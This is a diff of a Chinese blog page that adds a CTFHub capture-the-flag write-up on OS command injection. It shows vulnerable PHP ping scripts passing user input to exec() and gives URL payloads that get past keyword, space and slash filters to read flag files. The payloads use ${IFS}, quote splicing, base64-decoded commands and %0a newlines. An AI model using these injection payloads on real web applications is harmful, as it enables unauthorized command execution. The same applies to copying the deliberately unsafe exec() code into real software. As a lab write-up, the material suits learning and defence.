@@ -475,14 +475,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.6k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    16 分
+                    19 分
                 </div>
                 
 
@@ -769,7 +769,8 @@ flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <h5 id="3-2-3、-tr-39-0-39-39-quot-1-39-lt-lt-lt"><a href="#3-2-3、-tr-39-0-39-39-quot-1-39-lt-lt-lt" class="headerlink" title="3.2.3、$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)"></a>3.2.3、<code>$(tr &#39;!-0&#39; &#39;&quot;-1&#39; &lt;&lt;&lt; .)</code></h5><pre class="line-numbers language-bash"><code class="language-bash">root@VALECALIDA:~<span class="token comment" spellcheck="true"># cat $(tr '!-0' '"-1' &lt;&lt;&lt; .)root$(tr '!-0' '"-1' &lt;&lt;&lt; .)flag.txt</span>
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="3-3、cat-的绕过"><a href="#3-3、cat-的绕过" class="headerlink" title="3.3、cat 的绕过"></a>3.3、<code>cat</code> 的绕过</h4><h5 id="3-3-1、变量拼接"><a href="#3-3-1、变量拼接" class="headerlink" title="3.3.1、变量拼接"></a>3.3.1、变量拼接</h5><p>让变量 <code>a</code> 、<code>b</code> 分别表示 <code>cat</code> 的某一部分，使得这两个变量拼接在一起时能够形成完整的 <code>cat</code></p>
+<h4 id="3-3、cat-的绕过"><a href="#3-3、cat-的绕过" class="headerlink" title="3.3、cat 的绕过"></a>3.3、<code>cat</code> 的绕过</h4><p>此处其他命令也是一样的方法</p>
+<h5 id="3-3-1、变量拼接"><a href="#3-3-1、变量拼接" class="headerlink" title="3.3.1、变量拼接"></a>3.3.1、变量拼接</h5><p>让变量 <code>a</code> 、<code>b</code> 分别表示 <code>cat</code> 的某一部分，使得这两个变量拼接在一起时能够形成完整的 <code>cat</code></p>
 <pre class="line-numbers language-bash"><code class="language-bash">root@DESKTOP-OHTJ68E:<span class="token comment" spellcheck="true"># a=ca;b=t;$a$b${IFS}flag.txt</span>
 flag
 flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -915,7 +916,148 @@ flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
 <p>可以看到获取到了文件夹下的相关内容，接着直接获取 <code>flag</code> </p>
 <img src="https://s1.ax1x.com/2020/05/11/YGfLVS.png">
 
-<h3 id="2、CTFHUB"><a href="#2、CTFHUB" class="headerlink" title="2、CTFHUB"></a>2、CTFHUB</h3><h3 id="3、Webug"><a href="#3、Webug" class="headerlink" title="3、Webug"></a>3、Webug</h3><h3 id="4、"><a href="#4、" class="headerlink" title="4、"></a>4、</h3>
+<h3 id="2、CTFHUB"><a href="#2、CTFHUB" class="headerlink" title="2、CTFHUB"></a>2、CTFHUB</h3><h4 id="2-1、过滤了-cat"><a href="#2-1、过滤了-cat" class="headerlink" title="2.1、过滤了 cat"></a>2.1、过滤了 <code>cat</code></h4><p><strong>源码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/cat/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>源码分析：</strong></p>
+<p>只是对输入的数据进行匹配，匹配到 <code>cat</code> 就过滤掉，置为空，没有就执行</p>
+<p><strong>突 破：</strong></p>
+<p><strong>常规方法：</strong></p>
+<p>使用 <code>more、less、tail、head、tac、grep...</code> 突破</p>
+<p><strong>绕过方法：</strong></p>
+<p>变量拼接绕过</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1%7C%7Ca<span class="token operator">=</span>c<span class="token punctuation">;</span>b<span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span><span class="token variable">${IFS}</span>flag_555743693183.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJ8GAe.png">
+
+<p><code>Base64</code> 编码绕过</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable"><span class="token variable">`</span>echo+Y2F0IGZsYWdfNTU1NzQzNjkzMTgzLnBocAo<span class="token operator">=</span>+<span class="token operator">|</span>+base64+-d<span class="token variable">`</span></span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJ8lnK.png">
+
+<p>单双引号绕过</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1<span class="token operator">||</span>ca%27%27t%20flag_555743693183.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJ810O.png">
+
+<p><code>$@</code> 绕过</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1<span class="token operator">||</span>ca<span class="token variable">$@t</span>%20flag_555743693183.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJ8JtH.png">
+
+<p>反斜线绕过</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1<span class="token operator">||</span>ca\t%20flag_555743693183.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJ837D.png">
+
+<h4 id="2-2、过滤了空格"><a href="#2-2、过滤了空格" class="headerlink" title="2.2、过滤了空格"></a>2.2、过滤了空格</h4><p><strong>源码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>源码分析：</strong></p>
+<p>该程序对所有用户输入的数据中的空格做过滤。</p>
+<p><strong>突 破：</strong></p>
+<p>这里只写几种方式，方式比较多，就不一一写了。</p>
+<p>使用 <code>1|ls</code> 确认包含 <code>flag</code> 的文件名为：<code>flag_3854640629200.php</code></p>
+<p><strong>使用 <code>&lt;</code> 绕过</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1%7Ccat%3Cflag_3854640629200.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJhkkD.png">
+
+<p><strong>使用 <code>${IFS}</code> 绕过</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1%7Ccat<span class="token variable">${IFS}</span>flag_3854640629200.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJhiTO.png">
+
+<p><strong>使用 <code>$IFS$9</code></strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1%7Ccat<span class="token variable">$IFS</span><span class="token variable">$9flag_3854640629200</span>.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJhP0K.png">
+
+<h4 id="2-3、过滤目录分隔符"><a href="#2-3、过滤目录分隔符" class="headerlink" title="2.3、过滤目录分隔符"></a>2.3、过滤目录分隔符</h4><p><strong>源码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\//"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>源码分析：</strong></p>
+<p>本次只过滤一个 <code>/</code> 符号，也就是目录分割符。</p>
+<p><strong>突破：</strong></p>
+<p>最基本的思路是切换路径，然后查看 <code>flag</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>127.0.0.1<span class="token punctuation">;</span><span class="token function">cd</span> flag_is_here<span class="token punctuation">;</span><span class="token function">cat</span> flag_39981724213143.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJT2T0.png">
+
+<p><strong>使用 <code>${PATH:0:1}</code> 即环境变量绕过</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>1<span class="token operator">|</span>cat%20flag_is_here<span class="token variable">${PATH:0:1}</span>flag_39981724213143.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJTuo6.png">
+
+<p><strong>使用 <code>$(echo . | tr &#39;!-0&#39; &#39;&quot;-1&#39;)</code> 绕过</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>127.0.0.1<span class="token operator">|</span><span class="token function">cat</span> flag_is_here<span class="token punctuation">$(</span>echo <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'!-0'</span> <span class="token string">'"-1'</span><span class="token punctuation">)</span>flag_39981724213143.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJTndx.png">
+
+<h4 id="2-4、综合练习"><a href="#2-4、综合练习" class="headerlink" title="2.4、综合练习"></a>2.4、综合练习</h4><p><strong>源码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {$ip}"</span><span class="token punctuation">;</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>源码分析：</strong></p>
+<p>代码中过滤了 <code>|</code> 、<code>&amp;</code>、<code>;</code>、<code>/</code>、<code>cat</code>、<code></code>、<code>flag</code>、<code>ctfhub</code>、所以说 <code>||</code> 和 <code>&amp;&amp;</code> 也都不能用了，这时候就需要没有空格的执行命令了</p>
+<p><strong>突破：</strong></p>
+<p>Linux下默认的换行符为<code>0a</code>，在<code>URL</code>中也可以用 <code>%0a</code> 来代替，另外还有回车符 <code>%0d</code></p>
+<p>先获取当前目录信息</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>127.0.0.1%0als<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJxBE4.png">
+
+<p>可以看到，这里<code>flag</code> 所在路径在 <code>flag_is_here</code> 这个文件夹下面，所以下一步需要探查这个文件夹下的内容，用 <code>${IFS}</code> 代替空格，<code>[a-z]</code> 代表其中的一个字符，进行查询</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>127.0.0.1%0als<span class="token variable">${IFS}</span>fla<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>_is_here<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJxwbF.png">
+
+<p>可以看到包含 <code>flag</code> 的文件名称为： <code>flag_324971920919598.php</code>，接着就需要获取 <code>flag</code> 信息了</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>127.0.0.1%0amore<span class="token variable">${IFS}</span>fla<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>_is_here<span class="token variable">${PATH:0:1}</span>fl<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>g_324971920919598.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJxdDU.png">
+
+<p>还可以构造</p>
+<pre class="line-numbers language-bash"><code class="language-bash">?ip<span class="token operator">=</span>127.0.0.1%0acd<span class="token variable">${IFS}</span>fla<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>_is_here%0ac%27%27at<span class="token variable">${IFS}</span>fl<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>g_324971920919598.php<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="https://s1.ax1x.com/2020/05/11/YJxauT.png">
+
+<p>当然还有其他的一些变形，就不都写出来了</p>
+<h3 id="Addtions："><a href="#Addtions：" class="headerlink" title="Addtions："></a>Addtions：</h3><p>后续会再补充新的姿势进来，敬请期待….</p>
+
             </div>
             <hr/>
 
@@ -1534,7 +1676,7 @@ flag_is_here<span aria-hidden="true" class="line-numbers-rows"><span></span><spa
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">47.2k</span>&nbsp;字
+                class="white-color">47.9k</span>&nbsp;字
             
             
             
